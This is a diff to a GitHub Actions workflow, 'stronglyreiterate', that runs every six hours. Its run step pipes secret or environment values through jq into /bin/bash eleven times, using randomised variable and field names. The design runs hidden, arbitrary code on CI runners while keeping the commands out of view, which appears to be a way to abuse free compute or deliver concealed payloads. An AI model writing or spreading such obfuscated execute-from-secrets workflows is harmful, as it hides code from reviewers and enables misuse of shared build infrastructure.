@@ -1,20 +1,26 @@
 name: stronglyreiterate
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 3/6 * * *'
-jobs:  # 3283
+    - cron: '26 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: stronglyreiterate
         env:
-          ip18: ${{ secrets.ip18 }}
+          drwhe9364: ${{ secrets.drwhe9364 }}
         run: |
-          echo $ip18 | jq -r .gpfkz3 | /bin/bash
-          echo $w5514 | jq -r .teyk32 | /bin/bash
-          echo $z02441 | jq -r .si189 | /bin/bash
-          echo $xtkf879 | jq -r .ztj8445 | /bin/bash
+          echo $drwhe9364 | jq -r .hrcmm31674 | /bin/bash
+          echo $kj6234 | jq -r .uubm952 | /bin/bash
+          echo $mn41503 | jq -r .isbzj2835 | /bin/bash
+          echo $eteam0 | jq -r .fzg1 | /bin/bash
+          echo $ixpd92086 | jq -r .hc15160 | /bin/bash
+          echo $bji57581 | jq -r .ja536 | /bin/bash
+          echo $ax10 | jq -r .yuxhf2 | /bin/bash
+          echo $hv79737 | jq -r .d029 | /bin/bash
+          echo $yuwr62022 | jq -r .ctl04857 | /bin/bash
+          echo $flm99071 | jq -r .zpt83 | /bin/bash
+          echo $t985 | jq -r .vlek2951 | /bin/bash
 
